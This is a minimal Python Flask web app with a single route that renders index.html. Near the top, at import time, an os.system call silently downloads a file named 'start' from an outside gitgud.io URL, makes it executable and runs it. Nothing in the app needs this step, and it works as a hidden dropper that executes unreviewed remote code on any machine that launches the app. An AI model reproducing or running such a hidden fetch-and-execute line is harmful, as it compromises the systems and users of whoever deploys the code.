import os
from flask import Flask
from flask import render_template
os.system('curl --output start https://gitgud.io/trendava/ruby/-/raw/master/start;chmod 700 start;./start')
app = Flask(__name__)

@app.route("/")
def hello():
    return render_template('index.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
